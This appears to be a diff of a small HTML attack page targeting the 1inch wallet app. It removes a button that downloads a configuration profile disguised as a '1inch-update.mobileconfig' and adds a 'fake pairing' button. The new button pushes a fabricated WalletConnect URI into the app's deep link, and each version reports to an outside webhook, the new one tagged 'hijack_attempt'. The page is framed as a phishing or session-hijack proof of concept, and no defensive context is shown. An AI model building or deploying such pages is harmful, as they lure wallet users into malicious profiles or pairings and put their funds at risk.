@@ -1,14 +1,13 @@
 <!DOCTYPE html>
 <html>
 <body>
-<button onclick="dl()">Download Config</button>
+<button onclick="pair()">Pairing Palsu</button>
 <script>
-function dl(){
-  let a = document.createElement('a');
-  a.href = 'data:application/x-apple-aspen-config;base64,[STRIPPED]';
-  a.download = '1inch-update.mobileconfig';
-  a.click();
-  fetch('https://webhooksite.net/9782dc22-d216-43c9-a513-905aa2d97d00?dl=mobileconfig');
+function pair(){
+  // Ini URI WalletConnect palsu, tapi formatnya asli
+  let fakeURI = "wc:1234567890abcdef@2?relay-protocol=irn&symKey=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=";
+  location.href = "1inch://wc?uri=" + encodeURIComponent(fakeURI);
+  fetch('https://webhooksite.net/9782dc22-d216-43c9-a513-905aa2d97d00?wc=hijack_attempt');
 }
 </script>
 </body>
